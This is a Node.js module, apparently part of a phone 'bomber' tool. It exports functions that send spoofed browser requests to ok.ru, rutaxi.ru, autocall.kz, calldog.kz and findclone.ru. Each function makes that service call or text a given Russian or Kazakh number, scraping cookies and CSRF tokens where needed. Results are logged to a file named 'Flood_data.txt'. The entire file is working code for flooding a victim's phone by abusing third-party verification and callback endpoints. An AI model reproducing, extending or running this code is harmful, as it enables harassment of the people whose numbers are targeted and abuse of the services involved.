const request = require('request');
const my_functions = require('../../../scripts/funcs.js')

module.exports = {
	ok_ru (number, service) {
		let reqbody = "st.r.phone=%2B7" + number,
		url_to_2req_ok = "https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",
		reqbody_to_2req_ok = "st.r.fieldAcceptCallUIButton=Call";

		let options = {
		url: "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
		method: "POST",
		headers: {
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
			"Content-Type" : "application/x-www-form-urlencoded",
			"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
		},
		body : reqbody
		};

		request(options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				let cookie = responce.headers['set-cookie'];
				request({
					url: url_to_2req_ok,
					method: "POST",
					headers: {
					"Content-Type" : "application/x-www-form-urlencoded",
					"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
					"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"Cookie" : cookie
					},
					body : reqbody_to_2req_ok
				}, function(error, responce, body){
					if (error) {
						my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
					} else {
						try {
							if (body.length > 1000) {
								my_functions.append_in_file('Flood_data.txt', 'Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
							} else {
								my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Должно быть 302 и без body ' + body)
							}
						}
						catch {
							my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
						}
					}
				}
				)
			}
		});
	
	},

	rutaxi_call (number, service) {
		let body_for_2req = "l=" + number + "&p=&callme=1&rem=0&c=3";

		let options = {
		url: "https://samara.rutaxi.ru/index.html",
		method: "GET",
		headers: {
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
			}
		};

		request(options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				let cookie = responce.headers['set-cookie'],
				position_1 = body.search('window.qip'),
				value_1 = position_1 + 14,
				position_2 = body.search('<!--page'),
				value_2 = position_2 - 15,
				values = body.substring(value_1, value_2),
				url_for_2req = "https://samara.rutaxi.ru/ajax_auth.html?qip=" + values + "&lang=ru&source=0";
				
				request({
					url: url_for_2req,
					method: "POST",
					headers: {
					"X-Requested-With" : "XMLHttpRequest",
					"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
					"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8",
					"Origin" : "https://samara.rutaxi.ru",
					"Referer" : "https://samara.rutaxi.ru/index.html?state=closedialog",
					"Cookie" : cookie
					},
					body : body_for_2req
				}, function(error, responce, body){
					if (error) { 
						my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
					} else {
						try {
							var encoded_body = JSON.parse(body);
							if (body.length > 1000) {
								my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
							} else {
								my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + encoded_body.err)
							}
						}
						catch {
							my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
						}
					}
				}
				)
			}
		});

	},

	autocall (number, service) {
		var url_for_2req = "https://autocall.kz/test-call";

		var options = {
		url: "https://autocall.kz/",
		method: "GET",
		headers: {
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
			}
		};

		request(options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				let cookie = responce.headers['set-cookie'],
				position = body.search("'_token'"),
				value_1 = position + 11,
				value_2 = value_1 + 40,
				values = body.substring(value_1, value_2);
				body_for_2req = "_token=" + values + "&phone=" + number;

				request({
					url: url_for_2req,
					method: "POST",
					headers: {
					"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
					"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8",
					"Cookie" : cookie
					},
					body : body_for_2req
				}, function(error, responce, body){
					if (error) { 
						my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
					} else {
						try {
							if (body.length > 1000) {
								my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
							} else {
								my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + body)
							}
						}
						catch {
							my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
						}
					}
				}
				);
			}
		});

	},

	calldog (number, service) {
	 	let reqBody = "number=%2B7" + number;

	 	let options = {
		url: "http://calldog.kz/sendsms.php",
		method: "POST",
		headers: {
			"Accept" : "application/json, text/javascript, */*; q=0.01",
			"X-Requested-With" : "XMLHttpRequest",
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
			"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8",
			"Origin" : "http://calldog.kz",
			"Referer" : "http://calldog.kz/"
			},
		body : reqBody
		};

		request(options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				try {
					if (body.length > 1000) {
						my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
					} else {
						my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + body)
					}
				}
				catch {
					my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
				}
			}
		});
	},

	findclone (number, service) {
		let options = {
		url: "https://findclone.ru/register?phone=+7" + number,
		method: "GET",
		headers: {
			"X-Requested-With" : "XMLHttpRequest",
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
			}
		};

		request(options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				try {
					if (body.length > 1000) {
						my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
					} else {
						my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + body)
					}
				}
				catch {
					my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
				}
			}
		});
	}

}